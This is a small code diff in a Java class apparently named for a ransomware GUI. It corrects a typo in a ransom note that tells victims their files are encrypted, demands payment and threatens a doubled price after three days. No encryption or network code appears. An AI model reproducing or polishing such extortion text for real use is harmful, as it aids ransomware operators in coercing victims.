@@ -199,7 +199,7 @@ public class GUIApplicationRansomware extends GUIApplicationWindow{
         informationTextArea.append("Your important files are encrypted\n");
         informationTextArea.append("Many of your documents, photos, videos, databases and other files are no longer accessible\n because they have been encrypted. Maybe you are busy looking for a way to recover your files, \n but do not waste your time. Nobody can revocer your files withour our decryption service.\n\n");
         informationTextArea.append("Can I Recover My Files?\n");
-        informationTextArea.append("Sure. We guarantee that you can recover all your files afely and easily. But you have not so enough time.\n");
+        informationTextArea.append("Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time.\n");
         informationTextArea.append("You can decrypt some of your files for free. Try now by clicking <Decrypt>\n");
         informationTextArea.append("But if you want to decrypt all your files, you need to pay\n");
         informationTextArea.append("You only have 3 days to submit the payment. After that the price will doubled.\n");
